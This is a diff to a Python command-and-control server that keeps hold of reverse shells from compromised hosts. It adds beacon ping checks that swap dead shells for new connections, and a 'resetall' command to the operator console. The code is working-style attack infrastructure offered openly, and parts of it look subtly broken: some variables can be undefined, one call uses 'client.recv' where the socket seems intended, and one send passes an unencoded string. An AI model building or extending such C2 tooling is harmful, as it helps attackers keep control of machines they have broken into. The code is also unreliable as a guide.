@@ -355,17 +355,30 @@ def startServer():
             # print(f"\n[SERVER] New Connection Received From: {addr[0]}:{addr[1]}")
             client_sock.send("getIP".encode())
             IP = client_sock.recv(BUFFER_SIZE).decode()
-            if IP in CURRENT_IPS: #if there is already a connection, drop the new one
+            for client in CURRENT_CONNECTIONS_CLASS: #if the client is already connected
+                drop = False #were not going to drop it
+                new = True #it is new
+                if IP == client.IP: #ping the client box and if we don't get pong back, drop the shell and take the new one
+                    new = False #it isn't new, we already have it silly!
+                    try:
+                        client.socket.send("beacon_ping".encode()) #send that ping
+                        assert "beacon_pong" in client.recv(BUFFER_SIZE).decode() #get that pong
+                        drop = True #cool we have a working shell, drop the new one
+                    except: #if the current socket doesn't work, just swap the sockets
+                        client.socket = client_sock #bro the old shell is borked, just take the new one
+                    break #stop looking through clients
+            if drop: #if there is already a connection, drop the new one
                 client_sock.send("ENDCONNECTION".encode())
                 continue
-            try:
-                X = Connection(addr,client_sock, IP)
-            except:
-                continue
-            CURRENT_CONNECTIONS_CLASS.append(X)
-            CURRENT_CONNECTIONS.append(client_sock)
-            CURRENT_ADDRESSES.append(addr)
-            CURRENT_IPS.append(X.IP)
+            if new:
+                try:
+                    X = Connection(addr,client_sock, IP)
+                except:
+                    continue
+                CURRENT_CONNECTIONS_CLASS.append(X)
+                CURRENT_CONNECTIONS.append(client_sock)
+                CURRENT_ADDRESSES.append(addr)
+                CURRENT_IPS.append(X.IP)
             # print(f"[SERVER] Active Connections: {threading.activeCount() - 6}")
             # print("cmd>")
     except (KeyboardInterrupt, SystemExit, ConnectionAbortedError):
@@ -461,6 +474,10 @@ def clearConnections():
             pass
         UNASSIGNED_CONNECTIONS.remove(connection)
 
+def resetAll():
+    for client in CURRENT_CONNECTIONS_CLASS:
+        client.socket.send("reset_connection")
+
 #Main Console for C2
 def handleCommand():
     while True:
@@ -490,6 +507,8 @@ def handleCommand():
                     host.listHosts()
             elif cmd.lower() == "clearcon":
                 clearConnections()
+            elif cmd.lower() == "resetall":
+                resetAll()
             elif cmd.lower() == "help":
                 print("\nHelp Menu: \n\tUse 'list' to list active connections. \
                     \n\tUse 'select' to choose a client from the list. \
@@ -500,6 +519,7 @@ def handleCommand():
                     \n\tUse 'service' to list services. \
                     \n\tUse 'lshost' to list all hosts under a hostname. \
                     \n\tUse 'clearcon' to send a reset to all unassigned clients. \
+                    \n\tUse 'resetall' to send a reset to all clients. \
                     \n\tUse 'help' to show this menu. \
                     \n\tUse 'exit' to quit the program.")
             elif cmd.lower() == "exit":
